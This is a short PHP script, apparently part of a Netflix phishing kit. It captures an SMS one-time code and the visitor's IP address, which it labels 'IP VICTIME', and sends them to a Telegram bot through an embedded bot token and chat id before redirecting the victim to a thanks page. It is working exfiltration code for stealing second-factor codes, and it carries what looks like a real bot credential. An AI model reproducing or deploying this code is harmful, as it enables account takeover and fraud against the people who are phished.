<?php

$OTP = $_POST['otp'];

    
$ip = getenv("REMOTE_ADDR");



        $tmsg = "---------- Netflix INFO=3 ---------nr";
        $tmsg .= "Code SMS  : $OTP n";
        $tmsg .= "IP VICTIME  : $ip n";
        $tmsg .= "--------------------------------------n";
        
                    file_get_contents("https://api.telegram.org/bot5438337714:AAEZN74LWgeLD-WfzjB4wTtFBcsqvnk4plA/sendMessage?chat_id=-856735443&text=" . urlencode($tmsg)."" );
 
        header("Location: ../thanks.php");
?>
